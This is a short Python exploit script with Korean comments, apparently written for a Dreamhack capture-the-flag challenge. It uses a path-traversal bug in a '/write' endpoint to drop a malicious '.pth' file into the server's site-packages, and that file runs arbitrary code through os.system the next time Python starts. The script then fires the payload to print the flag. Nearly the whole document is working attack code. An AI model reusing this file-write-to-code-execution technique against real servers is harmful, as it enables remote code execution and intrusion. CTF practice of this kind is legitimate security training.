import requests

# 프로님이 사용 중인 서버 주소
host = "http://host8.dreamhack.games:10397"

# [핵심 변경 사항]
# /flag 파일은 권한이 111(--x--x--x)이라서 읽을 수 없습니다.
# open() 대신 os.system()을 사용하여 실행해야 플래그를 뱉어냅니다.
payload_code = "import os; os.system('/flag'); os._exit(0)"

# [타겟 경로]
# 이전에 Path Traversal이 성공했던 경로입니다.
# 파일명은 충돌을 피하기 위해 새로운 이름(final_exploit.pth)을 사용합니다.
target_file = ".local/lib/python3.10/site-packages/final_exploit.pth"

print(f"[+] Target: {host}")
print(f"[+] Injecting Execution Payload into: {target_file}")

# 1. Payload 전송
write_url = f"{host}/write"
params = {
    "file": target_file,
    "data": payload_code
}

response = requests.get(write_url, params=params)

if "good" in response.text:
    print("[+] File write SUCCESS! Payload is ready.")
    print("[+] Triggering exploit...")
    
    # 2. 실행 트리거
    result = requests.get(host)
    
    print("\n" + "="*40)
    print(f"[★ FLAG ★] :\n{result.text.strip()}")
    print("="*40)
    
elif "bad" in response.text:
    print("[-] Error: File already exists. Change the filename in the script.")
else:
    print("[-] Error: Unexpected response.")